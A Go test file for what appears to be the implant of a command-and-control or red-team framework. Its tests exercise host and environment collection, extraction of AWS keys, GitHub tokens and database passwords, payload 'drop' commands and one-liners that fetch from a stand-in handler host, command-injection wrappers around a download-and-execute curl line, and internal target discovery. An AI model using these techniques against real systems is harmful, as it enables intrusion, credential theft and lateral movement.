package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"testing"
	"time"
)

func TestCollectEvidence(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	ev := CollectEvidence(ctx)
	if ev == nil {
		t.Fatal("CollectEvidence returned nil")
	}

	if ev.OS != runtime.GOOS {
		t.Errorf("OS = %q, want %q", ev.OS, runtime.GOOS)
	}
	if ev.Arch != runtime.GOARCH {
		t.Errorf("Arch = %q, want %q", ev.Arch, runtime.GOARCH)
	}
	if ev.PID != os.Getpid() {
		t.Errorf("PID = %d, want %d", ev.PID, os.Getpid())
	}
	if ev.Hostname == "" {
		t.Error("Hostname is empty")
	}
	if ev.User == "" {
		t.Error("User is empty")
	}
	if len(ev.Environment) == 0 {
		t.Error("Environment is empty")
	}
	if ev.Network == nil {
		t.Error("Network is nil")
	}
	if ev.Network != nil && len(ev.Network.Interfaces) == 0 {
		t.Error("No network interfaces found")
	}
	if ev.Timestamp.IsZero() {
		t.Error("Timestamp is zero")
	}

	// Evidence should be JSON-serializable.
	data, err := json.Marshal(ev)
	if err != nil {
		t.Fatalf("Evidence not JSON-serializable: %v", err)
	}
	if len(data) < 100 {
		t.Errorf("Evidence JSON suspiciously small: %d bytes", len(data))
	}
}

func TestCollectNetwork(t *testing.T) {
	info := collectNetwork()
	if info == nil {
		t.Fatal("collectNetwork returned nil")
	}
	if info.Hostname == "" {
		t.Error("Hostname is empty")
	}
	if len(info.Interfaces) == 0 {
		t.Error("No interfaces found")
	}

	// At least one interface should have an address.
	hasAddr := false
	for _, iface := range info.Interfaces {
		if len(iface.Addrs) > 0 {
			hasAddr = true
			break
		}
	}
	if !hasAddr {
		t.Error("No interface has an address")
	}
}

func TestCollectEnv(t *testing.T) {
	t.Setenv("BEACON_TEST_VAR", "test_value")

	env := collectEnv()
	if v, ok := env["BEACON_TEST_VAR"]; !ok || v != "test_value" {
		t.Errorf("BEACON_TEST_VAR = %q, want %q", v, "test_value")
	}
}

func TestExtractCredentials(t *testing.T) {
	env := map[string]string{
		"DB_PASSWORD":           "supersecret123",
		"AWS_ACCESS_KEY_ID":     "AKIAIOSFODNN7EXAMPLE",
		"AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		"GITHUB_TOKEN":          "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh",
		"DATABASE_URL":          "postgres://admin:secret@db.example.com:5432/mydb",
		"SAFE_VAR":              "nothing_interesting",
	}

	files := []FileEvidence{
		{
			Path:    "/app/.env",
			Content: "DB_CONN=postgres://dbuser:dbpass@db.internal:5432/prod\nDEBUG=true",
		},
	}

	creds := extractCredentials(env, files)
	if len(creds) == 0 {
		t.Fatal("No credentials extracted")
	}

	// Should find DB_PASSWORD.
	found := false
	for _, c := range creds {
		if c.Source == "env:DB_PASSWORD" && c.Value == "supersecret123" {
			found = true
			break
		}
	}
	if !found {
		t.Error("DB_PASSWORD not found in extracted credentials")
	}

	// Should find AWS key.
	foundAWS := false
	for _, c := range creds {
		if c.Type == "api_key" && c.Value == "AKIAIOSFODNN7EXAMPLE" {
			foundAWS = true
			break
		}
	}
	if !foundAWS {
		t.Error("AWS access key not found in extracted credentials")
	}

	// Should find GitHub token.
	foundGH := false
	for _, c := range creds {
		if c.Value == "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh" {
			foundGH = true
			break
		}
	}
	if !foundGH {
		t.Error("GitHub token not found in extracted credentials")
	}

	// Should find database connection string from file.
	foundDBConn := false
	for _, c := range creds {
		if c.Source == "file:/app/.env" && c.Type == "connection_string" {
			foundDBConn = true
			break
		}
	}
	if !foundDBConn {
		t.Error("Database connection string not found in file credentials")
	}
}

func TestGenerateToken(t *testing.T) {
	t1 := GenerateToken()
	t2 := GenerateToken()
	if t1 == t2 {
		t.Error("Two generated tokens are identical")
	}
	if len(t1) != 32 {
		t.Errorf("Token length = %d, want 32", len(t1))
	}
}

func TestDropCommands(t *testing.T) {
	methods := DropCommands("https://handler.example.com/agent", "handler.example.com:4443", "abc123", 60, "linux")
	if len(methods) == 0 {
		t.Fatal("No drop methods returned")
	}

	// Should have curl, wget, python, perl, and base64 methods.
	names := make(map[string]bool)
	for _, m := range methods {
		names[m.Name] = true
		if len(m.Commands) == 0 {
			t.Errorf("Method %q has no commands", m.Name)
		}
	}
	if !names["curl + exec"] {
		t.Error("Missing curl drop method")
	}
	if !names["wget + exec"] {
		t.Error("Missing wget drop method")
	}
}

func TestOneLiners(t *testing.T) {
	liners := OneLiners("https://handler.example.com/agent", "handler.example.com:4443", "abc123", 60)
	if len(liners) == 0 {
		t.Fatal("No one-liners returned")
	}
	if _, ok := liners["curl"]; !ok {
		t.Error("Missing curl one-liner")
	}
	if _, ok := liners["wget"]; !ok {
		t.Error("Missing wget one-liner")
	}
}

func TestInjectPayload(t *testing.T) {
	liner := "curl -o /tmp/a https://x && chmod +x /tmp/a && /tmp/a"

	tests := []struct {
		vector string
		prefix string
	}{
		{"cmdinj_semicolon", "; "},
		{"cmdinj_pipe", "| "},
		{"cmdinj_dollar", "$("},
	}

	for _, tt := range tests {
		result := InjectPayload(liner, tt.vector)
		if result == "" {
			t.Errorf("InjectPayload(%q) returned empty", tt.vector)
		}
		if result == liner {
			t.Errorf("InjectPayload(%q) didn't modify payload", tt.vector)
		}
	}
}

func TestShellCommand(t *testing.T) {
	shell, flag := shellCommand()
	if shell == "" || flag == "" {
		t.Error("shellCommand returned empty values")
	}
	if runtime.GOOS == "windows" {
		if shell != "cmd.exe" {
			t.Errorf("shell = %q, want cmd.exe on windows", shell)
		}
	} else {
		if flag != "-c" {
			t.Errorf("flag = %q, want -c on unix", flag)
		}
	}
}

func TestHandlerSessionManagement(t *testing.T) {
	handler, err := NewHandler("127.0.0.1:0")
	if err != nil {
		t.Fatalf("NewHandler: %v", err)
	}
	defer handler.Stop()

	sessions := handler.Sessions()
	if len(sessions) != 0 {
		t.Errorf("Expected 0 sessions, got %d", len(sessions))
	}

	s := handler.GetSession("nonexistent")
	if s != nil {
		t.Error("Expected nil session for nonexistent token")
	}
}

func TestPersistenceRemoval(t *testing.T) {
	// RemovePersistence should not panic even when nothing is installed.
	results := RemovePersistence()
	// Results may be empty — that's fine. Just verify no panic.
	_ = results
}

func TestDiscoverInternalTargets_NoInterfaces(t *testing.T) {
	targets := DiscoverInternalTargets(context.Background(), nil)
	if targets != nil {
		t.Error("Expected nil targets with nil network info")
	}

	targets = DiscoverInternalTargets(context.Background(), &NetworkInfo{})
	if targets != nil {
		t.Error("Expected nil targets with empty network info")
	}
}

func TestNextIP(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"192.168.1.0", "192.168.1.1"},
		{"192.168.1.254", "192.168.1.255"},
		{"192.168.1.255", "192.168.2.0"},
		{"10.0.0.1", "10.0.0.2"},
	}

	for _, tt := range tests {
		ip := []byte(nil)
		ip = append(ip, parseIPv4(tt.input)...)
		result := nextIP(ip)
		if result.String() != tt.expected {
			t.Errorf("nextIP(%s) = %s, want %s", tt.input, result.String(), tt.expected)
		}
	}
}

func parseIPv4(s string) []byte {
	var ip [4]byte
	var a, b, c, d int
	n, _ := fmt.Sscanf(s, "%d.%d.%d.%d", &a, &b, &c, &d)
	if n != 4 {
		return nil
	}
	ip[0] = byte(a)
	ip[1] = byte(b)
	ip[2] = byte(c)
	ip[3] = byte(d)
	return ip[:]
}
